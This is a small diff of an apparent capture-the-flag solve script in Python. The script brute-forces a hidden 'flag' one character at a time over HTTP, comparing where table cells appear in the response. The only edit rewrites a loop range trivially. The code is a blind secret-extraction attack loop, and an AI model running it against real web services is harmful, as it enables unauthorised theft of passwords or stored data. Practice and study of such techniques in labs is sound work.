@@ -8,7 +8,7 @@ data={
     'password':flag
 }
 for i in range(48):
-    for j in range(len(str)):
+    for j in range(0,len(str)):
         t=requests.get(url,data=data,params=param,cookies=cookie,timeout=1).text
         if t.find(f"<td>{flag}</td>")>t.find("<td>flag</td>"):
             flag=flag+str[j-1]
